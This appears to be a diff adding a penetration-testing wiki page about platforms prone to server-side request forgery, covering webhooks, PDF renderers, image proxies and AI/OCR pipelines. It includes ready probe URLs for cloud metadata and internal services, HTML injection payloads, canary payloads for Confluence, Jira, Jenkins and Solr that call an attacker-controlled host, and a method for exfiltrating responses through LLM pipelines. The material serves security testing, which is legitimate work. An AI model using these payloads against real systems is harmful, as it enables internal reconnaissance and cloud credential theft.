@@ -1,0 +1,214 @@
+# SSRF Vulnerable Platforms
+
+{{#include ../../banners/hacktricks-training.md}}
+
+This page is focused on **platforms and features that frequently turn a blind SSRF into a useful pivot**. For generic SSRF basics, gopher payloads and protocol abuse, check the main [SSRF page](README.md). For **cloud metadata endpoints**, check [cloud-ssrf.md](cloud-ssrf.md). For **parser and allowlist bypasses**, check [url-format-bypass.md](url-format-bypass.md).
+
+## High-signal modern SSRF surfaces
+
+### Webhooks, callbacks and outgoing integrations
+
+**Outgoing webhooks** are still one of the highest-signal places to hunt for SSRF. Modern SaaS products, self-hosted dashboards, Git services, on-call platforms, crawlers, and automation tools often let users register a callback URL and then send a server-side request to it later.
+
+This keeps showing up in recent advisories because the primitive is very powerful:
+
+- the request usually comes from a **privileged internal host**
+- the request is often **blind / asynchronous**
+- some implementations let you control the **method**, **headers**, and even the **body**
+- the webhook worker is commonly allowed to reach **RFC1918**, **localhost**, and **link-local metadata** unless explicit SSRF protections exist
+
+Recent examples include webhook SSRF issues in [**Grafana OnCall**](https://grafana.com/security/security-advisories/cve-2024-5526/), [**Gogs**](https://github.com/gogs/gogs/security/advisories/GHSA-w689-557m-2cvq), [**Soft Serve**](https://github.com/charmbracelet/soft-serve/security/advisories/GHSA-vwq2-jx9q-9h9f), and [**Firecrawl**](https://github.com/firecrawl/firecrawl/security/advisories/GHSA-p2wg-prhf-jx79).<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)</sup>
+
+Useful first probes:
+
+```text
+http://127.0.0.1:2375/version
+http://127.0.0.1:8500/v1/status/leader
+http://127.0.0.1:8983/solr/admin/info/system
+http://127.0.0.1:9200/_cat/health
+http://169.254.169.254/latest/meta-data/
+http://metadata.google.internal/computeMetadata/v1/
+```
+
+If the webhook feature lets you set **custom headers**, **non-GET methods**, or a **raw request body**, the impact increases a lot because you can start testing things like:
+
+- **GCP metadata** with `Metadata-Flavor: Google`
+- **AWS IMDSv2** token requests with `PUT /latest/api/token`
+- authenticated internal APIs that trust requests coming from the platform itself
+
+### HTML-to-PDF, screenshot and headless-browser renderers
+
+If a product can **render HTML into PDF**, generate a **screenshot**, create a **preview card**, or visit a page in a **headless browser**, treat it as an SSRF sink until proven otherwise.
+
+This is especially common in:
+
+- reporting / analytics exports
+- invoice or receipt generation
+- admin "print to PDF" features
+- screenshot-as-a-service tools
+- HTML-to-PDF APIs such as [**Gotenberg**](https://gotenberg.dev/docs/convert-with-chromium/convert-html-to-pdf) or wrappers around **Chromium** / **wkhtmltopdf**
+
+Typical probes:
+
+```html
+<img src="http://127.0.0.1:2375/version">
+<link rel="stylesheet" href="http://127.0.0.1:8983/solr/admin/info/system">
+<iframe src="http://169.254.169.254/latest/meta-data/"></iframe>
+<script>fetch('http://127.0.0.1:8080/')</script>
+```
+
+Notes:
+
+- Even if the response is not reflected, the feature is often a **blind SSRF gadget** and can still be verified with **OAST** interactions.
+- Headless Chromium based renderers may execute **JavaScript**, which makes them more powerful than simple `curl`-style fetchers.
+- If you find a PDF renderer that only accepts uploaded HTML, remember that **asset URLs** inside HTML/CSS are usually enough to get SSRF.
+
+For a bigger PDF-specific discussion, also check the HTML-to-PDF notes already present in the main [SSRF page](README.md#html-to-pdf-renderers-as-blind-ssrf-gadgets).
+
+### Importers, previewers, avatar fetchers and image proxies
+
+A lot of modern applications fetch remote content on behalf of the user without calling it a "webhook":
+
+- **repository import / mirroring**
+- **avatar import** from URL
+- **image fetch / resize / optimization** endpoints
+- **link preview / unfurl** workers
+- **feed readers**, **scrapers**, **crawler jobs**, **markdown previewers**
+- **OCR**, **AI image-generation**, and other model pipelines that first fetch a URL and then pass the bytes downstream
+
+A recent high-value example is **Next.js**:<sup>[[5]](#references)</sup>
+
+- the **`_next/image`** endpoint becomes a blind SSRF gadget when `remotePatterns` are too broad or when an allowed domain has an **open redirect**
+- **Server Actions** had a 2024 SSRF bug where a crafted request plus a server-side redirect could be turned into a **full-read SSRF** (fixed in [**Next.js 14.1.1**](https://github.com/vercel/next.js/security/advisories/GHSA-fr5h-rqp8-mj6g))<sup>[[6]](#references)</sup>
+
+Examples:
+
+```text
+/_next/image?url=https://localhost:8080/admin&w=256&q=75
+/_next/image?url=https://allowed.example/redirect?u=http://169.254.169.254/latest/meta-data/&w=256&q=75
+```
+
+When auditing these features, look for places where the platform:
+
+- resolves a user-controlled URL and then fetches it later
+- performs only a **single allowlist check** before following redirects
+- trusts the **Host** header or an internal rewrite step
+- assumes a resource is safe because it is an **image**, **PDF**, or **OpenGraph preview**
+
+### AI/OCR/media pipelines: verify **who** really fetches the URL
+
+A URL parameter that eventually influences OCR or image generation is **not automatically a useful SSRF against the target environment**. First map the fetch origin:<sup>[[7]](#references)</sup>
+
+- **target backend fetches it directly** --> real SSRF against that environment
+- **third-party service fetches it** (OCR provider, cloud Vision API, external crawler) --> the request originates from that provider, so you usually **can't reach the target's localhost, RFC1918 space, or metadata endpoints**
+- **browser fetches it** --> this is not SSRF
+
+Quick triage workflow:
+
+1. Send the URL to **Burp Collaborator / OAST** to confirm an outbound request exists.
+2. Compare the **source IP / ASN** of the callback with the target's infra.
+3. Read the code or trace the worker path to see whether the URL is handed to a third party or fetched by the application's own HTTP client.
+4. Treat provider-side fetching as a different issue class unless that provider can still reach something interesting for the engagement.
+
+### Turning blind SSRF into readable output through downstream processors
+
+If the server fetches the URL but does **not** return the body, inspect every field that controls how the fetched bytes are handled afterwards:<sup>[[7]](#references)</sup>
+
+- `mime_type`, `content_type`, `file_type`, `parser`, `mode`, `format`
+- prompt / attachment metadata sent to an OCR, LLM, preview, or image-generation pipeline
+- template flags that switch between **image**, **text**, **markdown**, **HTML**, or **OCR** modes
+
+A common upgrade path is:
+
+1. confirm **blind SSRF** with OAST
+2. point the URL to a harmless text endpoint such as `https://icanhazip.com`
+3. force the downstream processor to treat the response as **text** (for example `mime_type=text/plain`)
+4. look for the fetched response rendered inside the final artifact (generated image, OCR text, preview, moderation output, LLM response, PDF, etc.)
+
+This turns a blind callback into **response exfiltration** without ever receiving the raw HTTP body directly. In modern AI features, the vulnerable pattern is often: **fetch attacker URL -> base64/attach response -> send it to the model together with attacker-controlled type metadata -> render model output back to the user**.
+
+Useful proof targets once you suspect this pattern:
+
+```text
+https://icanhazip.com
+http://127.0.0.1:6060/debug/pprof/cmdline
+http://127.0.0.1:6060/debug/pprof/goroutine?debug=1
+http://169.254.169.254/latest/meta-data/
+http://169.254.170.2/v2/metadata
+```
+
+If you can only see error strings, they still help a lot: DNS failures, TLS validation errors, `401` from metadata services, and scheme-parsing errors often prove that the **backend** made the request and reached internal-only destinations.
+
+## Blind SSRF canaries against internal software
+
+When the primitive is blind, try to bounce it through **internal software that performs another outbound request** to your OAST domain. This both **proves reachability** and often **fingerprints the internal platform**.
+
+High-signal candidates taken from the Assetnote blind SSRF chains research:<sup>[[8]](#references)</sup>
+
+<details>
+<summary>Useful blind SSRF canaries</summary>
+
+```bash
+# Confluence Sharelinks
+/rest/sharelinks/1.0/link?url=https://SSRF_CANARY/
+
+# Confluence / Jira iconUriServlet
+/plugins/servlet/oauth/users/icon-uri?consumerUri=http://SSRF_CANARY
+
+# Jira makeRequest
+/plugins/servlet/gadgets/makeRequest?url=https://SSRF_CANARY:443@example.com
+
+# Jenkins GitHubTokenCredentialsCreator
+/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.github.config.GitHubTokenCredentialsCreator/createTokenByPassword?apiUrl=http://SSRF_CANARY/%23&login=a&password=b
+
+# Apache Solr shards=
+/search?q=Apple&shards=http://SSRF_CANARY/solr/collection/config%23&stream.body={"set-property":{"xxx":"yyy"}}
+
+# GitLab Redis exporter pivot
+/scrape?target=redis://127.0.0.1:7001&check-keys=*
+```
+
+</details>
+
+Other evergreen internal targets worth probing from a SSRF sink are:
+
+- **Docker API**: `/containers/json`, `/services`, `/secrets`
+- **Consul**: `/v1/status/leader`
+- **Elasticsearch**: `/_cluster/health`, `/_cat/indices`
+- **Solr**: `/solr/admin/info/system`
+- **Jenkins**: `/login`, `/script`, plugin-specific endpoints
+- **Prometheus / exporters / internal observability stacks**
+- **Go `pprof`**: `/debug/pprof/`, `/debug/pprof/cmdline`, `/debug/pprof/goroutine?debug=1`, `/debug/pprof/heap`
+
+This page is intentionally keeping the list short. For a much larger chain catalog, check the original Blind SSRF Chains research linked below.<sup>[[8]](#references)</sup>
+
+## Practical workflow
+
+1. **Confirm OAST** using Interactsh / Burp Collaborator / webhook.site.
+2. **Identify the fetch origin**: target backend, browser, or third-party provider. This decides whether you really have SSRF against the assessed environment.
+3. **Derive internal hostnames** from DNS data, certificates, ELB names, app error messages, or naming conventions such as `jira`, `jenkins`, `grafana`, `solr`, `consul`, `redis`, `gitlab`, `argo`, `vault`, `kibana`.
+4. **Spray platform-specific canaries** instead of only probing `/` on random ports.
+5. If the sink is blind, fuzz **downstream interpretation fields** (`mime_type`, parser/format flags, OCR or LLM attachment metadata) to try to convert it into a readable exfiltration channel.
+6. If you get any sign of internal reachability, pivot into:
+   - [cloud-ssrf.md](cloud-ssrf.md) for metadata endpoints
+   - [url-format-bypass.md](url-format-bypass.md) for allowlist bypasses
+   - protocol-specific exploitation from the main [SSRF page](README.md)
+
+A blind SSRF with only **DNS callbacks** can still be enough to:
+
+- prove access to **specific internal applications**
+- prove access to **cloud metadata**
+- turn a "low severity webhook issue" into a **credential theft** or **internal admin plane** finding
+
+## References
+
+- [1] [Grafana OnCall webhook SSRF advisory (CVE-2024-5526)](https://grafana.com/security/security-advisories/cve-2024-5526/)
+- [2] [Gogs webhook SSRF advisory (GHSA-w689-557m-2cvq)](https://github.com/gogs/gogs/security/advisories/GHSA-w689-557m-2cvq)
+- [3] [Soft Serve webhook SSRF advisory (GHSA-vwq2-jx9q-9h9f)](https://github.com/charmbracelet/soft-serve/security/advisories/GHSA-vwq2-jx9q-9h9f)
+- [4] [Firecrawl webhook SSRF advisory (GHSA-p2wg-prhf-jx79)](https://github.com/firecrawl/firecrawl/security/advisories/GHSA-p2wg-prhf-jx79)
+- [5] [Assetnote - Digging for SSRF in NextJS apps](https://www.assetnote.io/resources/research/digging-for-ssrf-in-nextjs-apps/)
+- [6] [Next.js Server Actions SSRF advisory (GHSA-fr5h-rqp8-mj6g)](https://github.com/vercel/next.js/security/advisories/GHSA-fr5h-rqp8-mj6g)
+- [7] [Bishop Fox - AI Finds Vulnerabilities. Security Experts Find Impact.](https://bishopfox.com/blog/ai-finds-vulnerabilities-security-experts-find-impact)
+- [8] [Assetnote - A Glossary of Blind SSRF Chains](https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/)
+
+{{#include ../../banners/hacktricks-training.md}}
